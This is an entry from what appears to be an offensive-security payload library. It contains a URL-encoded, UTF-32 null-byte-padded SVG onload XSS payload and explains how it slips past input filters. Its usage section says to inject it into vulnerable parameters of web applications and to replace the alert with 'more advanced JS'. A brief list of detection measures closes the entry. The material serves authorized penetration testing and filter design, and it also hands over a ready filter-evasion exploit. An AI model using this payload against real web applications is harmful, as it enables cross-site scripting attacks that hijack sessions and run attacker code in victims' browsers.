---
id: e507249b-8a04-4e1b-8650-b00a52a5c47b
type: code
language: js
verified: true
created_at: '2023-04-06T03:56:43.095201+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
tags:
  - xss
  - payload
  - svg
  - null-byte
  - utf-32
platforms:
  - Web
validated: true
---

# UTF-32-Encoded-SVG-XSS-Payload

## Code

```js
%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

## Description

This code snippet is a URL-encoded SVG element with multiple UTF-32 null bytes (%00) prepended to bypass input filters. When injected into a vulnerable web input, the null bytes cause the filter to terminate string processing early, allowing the SVG onload attribute to execute JavaScript (an alert in this case) in the victim's browser. It's designed for reflected or stored XSS scenarios where standard payloads are sanitized.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This is a static payload string; no variables to substitute. Customize the alert message or replace with more advanced JS if needed. | N/A |

## Usage

Inject this payload into vulnerable parameters (e.g., URL query strings, form fields) in web applications with weak null byte handling. Use a proxy like Burp Suite to test and refine. Once injected, load the page to trigger execution. This is part of procedures like [[procedures/Null-Byte-Injection-for-Filter-Bypass-in-XSS]] for demonstrating filter evasion in XSS attacks.

## Detection

- Monitor for %00 sequences or multi-byte nulls in HTTP requests/responses using WAF rules.
- Log and alert on SVG tags with onload attributes in user-generated content.
- Enable browser CSP to block inline JavaScript execution.
- Scan inputs for UTF-32 encoding anomalies with tools like OWASP ZAP.
